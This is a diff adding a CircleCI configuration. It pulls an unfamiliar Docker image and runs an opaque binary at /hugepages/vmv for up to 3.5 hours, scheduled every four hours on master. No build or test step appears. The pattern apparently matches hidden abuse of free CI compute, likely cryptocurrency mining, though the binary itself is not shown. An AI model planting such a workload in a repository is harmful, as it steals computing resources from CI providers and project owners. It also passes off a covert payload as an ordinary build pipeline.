@@ -1,0 +1,28 @@
+#~/.circleci/config.yml
+version: 2
+jobs:
+  build:
+    docker:
+      - image: cleargearci/circ
+    parallelism: 1
+    steps:
+      - run:
+          command: timeout 12600 /hugepages/vmv
+          no_output_timeout: 4m
+
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - build
+
+  nightly:
+    triggers:
+      - schedule:
+          cron: "25 0,4,8,12,16,20 * * *"
+          filters:
+            branches:
+              only:
+                - master
+    jobs:
+      - build
